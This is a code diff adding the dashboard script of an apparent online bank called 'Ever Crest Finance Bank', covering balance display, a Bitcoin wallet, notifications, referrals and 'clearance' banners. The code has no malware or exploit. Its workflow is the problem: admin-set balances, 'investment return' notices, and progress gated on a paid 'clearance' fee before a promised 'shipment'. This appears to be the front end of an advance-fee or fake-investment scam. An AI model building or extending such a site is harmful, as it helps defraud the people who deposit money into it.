+        const nameOf = d => ((d && d.fullName) || [d && d.firstName, d && d.otherName, d && d.lastName].filter(Boolean).join(' ')).trim();
+
+        /* ===== PROFILE PICTURE (saved on the profile page, in this browser's localStorage) ===== */
+        const avKey = uid => 'ec_avatar_' + uid;
+        function applyAvatar() {
+            const u = auth.currentUser, el = $('avatar');
+            let img = null;
+            try { img = u && localStorage.getItem(avKey(u.uid)); } catch (_) { }
+            el.style.backgroundImage = img ? 'url("' + img + '")' : '';
+            el.classList.toggle('has-img', !!img);
+            if (img) el.textContent = '';
+        }
+        window.addEventListener('storage', applyAvatar);   // updates if changed in another tab
+
+        function render(d) {
+            const nm = nameOf(d);
+            const first = (d.firstName || (nm.split(/\s+/)[0]) || 'there');
+            $('greet').textContent = 'Hi, ' + first;
+            $('avatar').textContent = nm ? nm.split(/\s+/).map(w => w[0]).slice(0, 2).join('').toUpperCase() : 'EC';
+            applyAvatar();   // the photo replaces the initials when one is saved
+            $('loading').hidden = true; $('app').hidden = false;
+        }
+        const showBalance = (n, c) => { $('balance').textContent = money(n, c); };
+
+        const NO_WALLET = 'No wallet yet';
+        function showWallet(w) {
+            const el = $('acctMeta');
+            const val = (w == null || String(w).trim() === '') ? NO_WALLET : String(w).trim();
+            el.classList.remove('review');
+            el.textContent = '';
+
+            if (val === NO_WALLET) {
+                el.textContent = 'No wallet address yet, account under review, check back later';
+                el.classList.add('review');
+                return;
+            }
+
+            const label = document.createElement('span');
+            label.textContent = 'Btc Wallet: ';
+
+            const btn = document.createElement('button');
+            btn.type = 'button';
+            btn.className = 'wallet-copy';
+            btn.title = 'Copy wallet address';
+            btn.setAttribute('aria-label', 'Copy wallet address');
+            const addr = document.createElement('span');
+            addr.textContent = val;
+            btn.appendChild(addr);
+            btn.appendChild(icon('i-copy'));
+
+            btn.addEventListener('click', async () => {
+                await copyText(val, 'Wallet address copied!');
+                const use = btn.querySelector('use');
+                use.setAttribute('href', '#i-check');
+                setTimeout(() => use.setAttribute('href', '#i-copy'), 1500);
+            });
+
+            el.append(label, btn);
+        }
+
+        /* ===== CLEARANCE BANNER CONTROL ===== */
+        let clearanceActivatedFlag = false;
+        let clearanceFormStatuses = {};
+        let clearanceFeeApproved = false;
+        let sectionBActivated = false;   // set by admin from section-b.html
+
+        function computeClearanceState() {
+            if (clearanceFeeApproved) return 'fee_approved_wait';
+            const statuses = Object.values(clearanceFormStatuses);
+            if (statuses.includes('approved')) return 'approved';
+            if (statuses.includes('pending')) return 'progress';
+            if (statuses.includes('active') || clearanceActivatedFlag) return 'action';
+            return 'none';
+        }
+
+        function renderClearanceBanner() {
+            const b = $('clearanceBanner');
+            const state = computeClearanceState();
+
+            if (state === 'none') { b.hidden = true; return; }
+            b.hidden = false;
+
+            if (state === 'fee_approved_wait') {
+                // Chat activated by admin -> the chat banner takes this banner's place
+                if (sectionBActivated) { b.hidden = true; return; }
+
+                b.classList.remove('approved');
+                b.classList.add('progress');
+                b.removeAttribute('href');
+                b.setAttribute('aria-disabled', 'true');
+                b.setAttribute('role', 'group');
+                $('cbTitle').textContent = 'Clearance Completed';
+                $('cbText').textContent = "Your shipment will arrive at your destination within 4 working days.";
+            } else if (state === 'approved') {
+                b.classList.remove('progress');
+                b.classList.add('approved');
+                b.setAttribute('href', 'proceed.html');
+                b.removeAttribute('aria-disabled');
+                b.removeAttribute('role');
+                $('cbTitle').textContent = 'Clearance Approved';
+                $('cbText').textContent = 'Your clearance has been verified and approved, you can now proceed.';
+                $('cbCtaLabel').textContent = 'Proceed';
+            } else if (state === 'progress') {
+                b.classList.remove('approved');
+                b.classList.add('progress');
+                b.removeAttribute('href');
+                b.setAttribute('aria-disabled', 'true');
+                b.setAttribute('role', 'group');
+                $('cbTitle').textContent = 'Verification in progress';
+                $('cbText').textContent = 'Your clearance form has been submitted and is under review. We will notify you once it is verified.';
+            } else {
+                b.classList.remove('progress', 'approved');
+                b.setAttribute('href', 'clearanceform.html');
+                b.removeAttribute('aria-disabled');
+                b.removeAttribute('role');
+                $('cbTitle').textContent = 'Action Required';
+                $('cbText').textContent = 'Payment approved and added to your wallet. Please complete the clearance form.';
+                $('cbCtaLabel').textContent = 'Complete Clearance';
+            }
+        }
+        $('clearanceBanner').addEventListener('click', e => {
+            const b = $('clearanceBanner');
+            if (b.classList.contains('progress')) e.preventDefault();
+        });
+
+        /* ===== SECTION B BANNER =====
+           Shown only when: clearance is completed (fee approved) AND admin activated this user.
+           When shown, it replaces the "Clearance Completed" banner. */
+        function renderSectionBBanner() {
+            $('sectionBBanner').hidden = !(sectionBActivated && clearanceFeeApproved);
+        }
+
+        /* ===== REFERRAL LINK (based on user name) ===== */
+        function slugify(s) {
+            return String(s || '')
+                .toLowerCase()
+                .trim()
+                .replace(/[^a-z0-9]+/g, '-')
+                .replace(/^-+|-+$/g, '')
+                .slice(0, 32);
+        }
+
+        function setReferralLink(uid, d) {
+            const isFile = location.protocol === 'file:';
+            const base = isFile
+                ? 'https://ever-crest-finance-bank.web.app/'   // your Firebase Hosting URL
+                : location.origin + location.pathname.replace(/[^/]*$/, '');
+
+            const nameSlug = slugify((d && d.firstName ? d.firstName : '') + '-' + (d && d.lastName ? d.lastName : ''));
+            const uidPart = String(uid || '').slice(0, 6);
+            const refCode = nameSlug ? `${nameSlug}_${uidPart}` : uid;
+
+            $('refLink').value = base + 'signup.html?ref=' + encodeURIComponent(refCode);
+        }
+        $('refCopy').addEventListener('click', () => {
+            const inp = $('refLink');
+            if (!inp.value) return;
+            copyText(inp.value, 'Referral link copied!');
+        });
+
+        (async () => {
+            await auth.authStateReady();
+            const user = auth.currentUser;
+            if (!user) { location.replace('login.html'); return; }
+            const uid = user.uid;
+            let d = null, cur = 'USD';
+
+            try {
+                await openDb(); sqlOk = true;
+                const p = q('SELECT data FROM profile WHERE uid=?', [uid])[0];
+                if (p) d = JSON.parse(p.data);
+                const a = q('SELECT balance, currency FROM account WHERE uid=?', [uid])[0];
+                if (d && Number(d.step) >= 4) {
+                    cur = (a && a.currency) || d.currency || 'USD';
+                    render(d); showBalance(a ? a.balance : 0, cur);
+                    notifs = q('SELECT * FROM notifs WHERE uid=? ORDER BY createdAt DESC', [uid]).map(n => ({ ...n, read: !!n.read }));
+                    startNotifs(uid);
+                }
+            } catch (e) { console.warn('Offline database unavailable:', e); }
+
+            try {
+                const snap = await get(ref(db, 'users/' + uid));
+                if (snap.exists()) {
+                    d = snap.val();
+                    if (sqlOk) run('INSERT OR REPLACE INTO profile(uid,data) VALUES(?,?)', [uid, JSON.stringify(d)]);
+                }
+            } catch (e) {
+                console.error(e);
+                if (!d) $('loading').textContent = 'We could not load your data. Check your connection and refresh.';
+                return;
+            }
+            const step = Number(d && d.step) || 1;
+            if (step < 4) { location.replace(ROUTES[Math.max(1, step)]); return; }
+            render(d);
+            if (!notifUid) startNotifs(uid);
+
+            $('referralSection').hidden = false;
+            setReferralLink(uid, d);
+
+            watchAccount(uid, d);
+            startActivity(uid);
+
+            onValue(ref(db, 'users/' + uid), snap => {
+                const u = snap.exists() ? snap.val() : {};
+                clearanceActivatedFlag = !!u.clearanceActivated;
+                sectionBActivated = (u.sectionBActivated === true);
+                renderClearanceBanner();
+                renderSectionBBanner();
+            });
+
+            onValue(ref(db, 'clearance_form/' + uid), snap => {
+                const statuses = {};
+                if (snap.exists()) {
+                    snap.forEach(child => {
+                        const v = child.val() || {};
+                        if (v.status) statuses[child.key] = v.status;
+                    });
+                }
+                clearanceFormStatuses = statuses;
+                renderClearanceBanner();
+            }, () => { /* ignore permission errors */ });
+
+            onValue(ref(db, 'clearance_payments/' + uid), snap => {
+                const v = snap.exists() ? snap.val() : {};
+                clearanceFeeApproved = (v.status === 'approved');
+                renderClearanceBanner();
+                renderSectionBBanner();
+            }, () => { /* ignore permission errors */ });
+        })();
+
+        function watchAccount(uid, d) {
+            onValue(ref(db, 'users/' + uid), snap => {
+                const u = snap.exists() ? snap.val() : (d || {});
+                showWallet(u.wallet);
+                const c = u.currency || 'USD';
+                const bal = Number(u.balance) || 0;
+                showBalance(bal, c);
+                if (sqlOk) run('INSERT OR REPLACE INTO account(uid,balance,currency) VALUES(?,?,?)', [uid, bal, c]);
+            }, () => { showWallet(d && d.wallet); showBalance(Number(d && d.balance) || 0, (d && d.currency) || 'USD'); });
+        }
+
+        const NS = 'http://www.w3.org/2000/svg';
+        function icon(id) {
+            const svg = document.createElementNS(NS, 'svg'); svg.setAttribute('aria-hidden', 'true');
+            const u = document.createElementNS(NS, 'use'); u.setAttribute('href', '#' + id);
+            svg.appendChild(u); return svg;
+        }
+        const fmtDate = t => new Date(Number(t)).toLocaleString('en-GB', { day: 'numeric', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' });
+
+        /* ===== RECENT ACTIVITY: notifications + transfers ===== */
+        function startActivity(uid) {
+            const isPercentNotif = n =>
+                n.title === 'Investment Return Added' ||
+                n.title === 'Investment Updated' ||
+                n.title === 'Investment Percentage Updated';
+
+            const IN_WORDS = /credit|received|deposit|bonus|refund|reward|added|top.?up/i;
+            const OUT_WORDS = /debit|withdraw|sent|transfer|charge|fee/i;
+            const isIn = n => {
+                if (isPercentNotif(n)) return true;
+                if (n.type === 'credit' || n.type === 'deposit') return true;
+                if (n.type === 'debit' || n.type === 'withdrawal') return false;
+                const t = (n.title || '') + ' ' + (n.message || '');
+                return IN_WORDS.test(t) && !OUT_WORDS.test(n.title || '');
+            };
+
+            let notifRows = [], txRows = [];
+
+            function draw() {
+                const list = [...notifRows, ...txRows]
+                    .sort((a, b) => (Number(b.createdAt) || 0) - (Number(a.createdAt) || 0))
+                    .slice(0, 10);
+                const ul = $('actList'); ul.innerHTML = '';
+                $('actEmpty').hidden = list.length > 0; ul.hidden = list.length === 0;
+                list.forEach(r => {
+                    const li = document.createElement('li');
+                    li.className = 'act-row ' + (r.dir === 'in' ? 'in' : 'out');
+                    const ic = document.createElement('span'); ic.className = 'act-ic';
+                    ic.appendChild(icon(r.icon));
+                    const main = document.createElement('div'); main.className = 'act-main';
+                    const tt = document.createElement('div'); tt.className = 'act-t'; tt.textContent = r.title;
+                    const dd = document.createElement('div'); dd.className = 'act-d'; dd.textContent = fmtDate(r.createdAt);
+                    main.append(tt, dd);
+                    const am = document.createElement('div'); am.className = 'act-a'; am.textContent = r.amountText;
+                    li.append(ic, main, am); ul.appendChild(li);
+                });
+            }
+
+            // All notifications except the two transfer ones (transfers come from transactions below)
+            onValue(ref(db, 'notifications/' + uid), snap => {
+                const v = snap.val() || {};
+                notifRows = Object.entries(v)
+                    .map(([id, n]) => ({ id, ...(n || {}) }))
+                    .filter(n => n.title !== 'Transfer successful' && n.title !== 'Money received')
+                    .map(n => {
+                        const pct = isPercentNotif(n);
+                        const approved = /approv/i.test(n.title || '');
+                        const inn = approved || isIn(n);
+                        let amountText = '';
+                        if (pct) {
+                            const m = /to\s+([\d.]+)%/.exec(n.message || '');
+                            amountText = m ? m[1] + '%' : '';
+                        } else if (!approved && n.amount != null) {
+                            amountText = (inn ? '+' : '-') + money(n.amount, n.currency || 'USD');
+                        }
+                        return {
+                            title: n.title || 'Notification',
+                            createdAt: n.createdAt,
+                            dir: inn ? 'in' : 'out',
+                            icon: approved ? 'i-check' : (pct ? 'i-coin' : (inn ? 'i-down' : 'i-up')),
+                            amountText
+                        };
+                    });
+                draw();
+            }, err => console.warn('Activity unavailable:', err && err.code));
+
+            // Transfers sent and received
+            onValue(ref(db, 'transactions/' + uid), snap => {
+                const v = snap.val() || {};
+                txRows = Object.values(v)
+                    .filter(t => t && (t.type === 'debit' || t.type === 'credit') && t.amount != null)
+                    .map(t => {
+                        const inn = t.type === 'credit';
+                        const who = t.counterparty || 'another account';
+                        return {
+                            title: inn ? 'Payment received from ' + who : 'Transfer to ' + who,
+                            createdAt: t.createdAt,
+                            dir: inn ? 'in' : 'out',
+                            icon: inn ? 'i-down' : 'i-up',
+                            amountText: (inn ? '+' : '-') + money(t.amount, t.currency || 'USD')
+                        };
+                    });
+                draw();
+            }, err => console.warn('Transactions unavailable:', err && err.code));
+        }
+
+        async function copyText(text, okMsg) {
+            try {
+                await navigator.clipboard.writeText(text);
+                toast(okMsg, 'success', 3000);
+            } catch (_) {
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                ta.style.cssText = 'position:fixed;opacity:0;top:0;left:0';
+                document.body.appendChild(ta);
+                ta.select();
+                try {
+                    document.execCommand('copy');
+                    toast(okMsg, 'success', 3000);
+                } catch (e) {
+                    toast('Could not copy. Please copy manually.', 'error', 4000);
+                }
+                ta.remove();
+            }
+        }
+
+        let snackTimer;
+        function toast(msg, type = 'info', ms = 6000) {
+            const sn = $('snack'); sn.textContent = msg; sn.className = 'snack ' + type;
+            void sn.offsetWidth; sn.classList.add('show');
+            clearTimeout(snackTimer); snackTimer = setTimeout(() => sn.classList.remove('show'), ms);
+        }
+
+        /* ===== NOTIFICATIONS (bell) ===== */
+        let notifUid = null, notifs = [], notifLoaded = false;
+        const ago = t => {
+            const m = Math.floor((Date.now() - Number(t)) / 60000);
+            if (!isFinite(m) || m < 0) return '';
+            if (m < 1) return 'Just now';
+            if (m < 60) return m + ' min ago';
+            if (m < 1440) return Math.floor(m / 60) + ' hr ago';
+            if (m < 43200) return Math.floor(m / 1440) + ' day' + (m >= 2880 ? 's' : '') + ' ago';
+            return new Date(Number(t)).toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });
+        };
+        function drawNotifs() {
+            const unread = notifs.filter(n => !n.read).length;
+            const c = $('nCount');
+            c.hidden = unread === 0;
+            c.textContent = unread > 9 ? '9+' : String(unread);
+            $('bell').setAttribute('aria-label', unread ? 'Notifications, ' + unread + ' unread' : 'Notifications');
+            $('markAll').hidden = unread === 0;
+            const ul = $('nList'); ul.innerHTML = '';
+            if (!notifs.length) { const li = document.createElement('li'); li.className = 'nempty'; li.textContent = 'No notifications yet.'; ul.appendChild(li); return; }
+            notifs.slice(0, 10).forEach(n => {
+                const li = document.createElement('li'); li.className = 'nitem' + (n.read ? '' : ' unread');
+                const dot = document.createElement('span'); dot.className = 'ndot';
+                const box = document.createElement('div');
+                const t = document.createElement('div'); t.className = 'nt'; t.textContent = n.title || 'Notification';
+                box.appendChild(t);
+                if (n.message) { const m = document.createElement('div'); m.className = 'nm'; m.textContent = n.message; box.appendChild(m); }
+                const w = document.createElement('div'); w.className = 'nw'; w.textContent = ago(n.createdAt); box.appendChild(w);
+                li.append(dot, box); ul.appendChild(li);
+            });
+        }
+        function saveNotifs() {
+            if (!sqlOk) return;
+            run('DELETE FROM notifs WHERE uid=?', [notifUid]);
+            notifs.forEach(n => run('INSERT OR REPLACE INTO notifs VALUES(?,?,?,?,?,?)',
+                [n.id, notifUid, n.title || '', n.message || '', Number(n.createdAt) || 0, n.read ? 1 : 0]));
+        }
+        function startNotifs(uid) {
+            notifUid = uid;
+            drawNotifs();
+            onValue(ref(db, 'notifications/' + uid), snap => {
+                const v = snap.val() || {};
+                const seen = new Set(notifs.map(n => n.id));
+                notifs = Object.entries(v).map(([id, n]) => ({ id, ...(n || {}) })).sort((a, b) => (Number(b.createdAt) || 0) - (Number(a.createdAt) || 0));
+                if (notifLoaded) {
+                    const fresh = notifs.find(n => !n.read && !seen.has(n.id));
+                    if (fresh) toast((fresh.title || 'Notification') + (fresh.message ? ': ' + fresh.message : ''), fresh.type === 'credit' ? 'success' : 'info', 7000);
+                }
+                notifLoaded = true;
+                saveNotifs(); drawNotifs();
+            }, err => console.warn('Notifications unavailable:', err && err.code));
+        }
+        async function markAllRead() {
+            const up = {};
+            notifs.forEach(n => { if (!n.read) { up[n.id + '/read'] = true; n.read = true; } });
+            if (!Object.keys(up).length) return;
+            saveNotifs(); drawNotifs();
+            try { await update(ref(db, 'notifications/' + notifUid), up); } catch (e) { console.warn('Could not mark read:', e && e.code); }
+        }
+        let readTimer;
+        function setPanel(open) {
+            $('nPanel').hidden = !open;
+            $('bell').setAttribute('aria-expanded', open);
+            if (open) { clearTimeout(readTimer); readTimer = setTimeout(() => { if (!$('nPanel').hidden) markAllRead(); }, 2500); }
+        }
+        $('bell').addEventListener('click', e => { e.stopPropagation(); setPanel($('nPanel').hidden); });
+        $('markAll').addEventListener('click', markAllRead);
+        $('nPanel').addEventListener('click', e => e.stopPropagation());
+        document.addEventListener('click', () => { if (!$('nPanel').hidden) setPanel(false); });
+        document.addEventListener('keydown', e => { if (e.key === 'Escape' && !$('nPanel').hidden) { setPanel(false); $('bell').focus(); } });
+    </script>
+</body>
+
+</html>
